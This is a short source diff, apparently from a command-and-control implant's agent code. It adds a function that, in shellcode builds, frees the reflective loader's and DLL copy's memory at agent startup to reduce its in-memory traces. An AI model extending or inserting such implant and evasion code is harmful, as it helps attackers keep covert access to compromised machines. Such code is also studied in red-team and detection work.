@@ -17,6 +17,28 @@
 #include "ConnectorDNS.h"
 #endif
 
+#if defined(BUILD_SHELLCODE)
+static void KaynFree(LPVOID lpParam)
+{
+	if ( !lpParam )
+		return;
+
+	PKAYN_ARGS pArgs = (PKAYN_ARGS) lpParam;
+	PVOID  addr;
+	SIZE_T zero;
+
+	zero = 0;
+	addr = pArgs->DllCopy;
+	if ( addr )
+		ApiNt->NtFreeVirtualMemory( NtCurrentProcess(), &addr, &zero, MEM_RELEASE );
+
+	zero = 0;
+	addr = pArgs->KaynLdr;
+	if ( addr )
+		ApiNt->NtFreeVirtualMemory( NtCurrentProcess(), &addr, &zero, MEM_RELEASE );
+}
+#endif
+
 Agent* g_Agent;
 Connector* g_Connector;
 
@@ -37,6 +59,10 @@ DWORD WINAPI AgentMain(LPVOID lpParam)
 {
 	if (!ApiLoad())
 		return 0;
+
+#if defined(BUILD_SHELLCODE)
+	KaynFree(lpParam);
+#endif
 
 	g_Agent = new Agent();
 	g_Connector = CreateConnector();
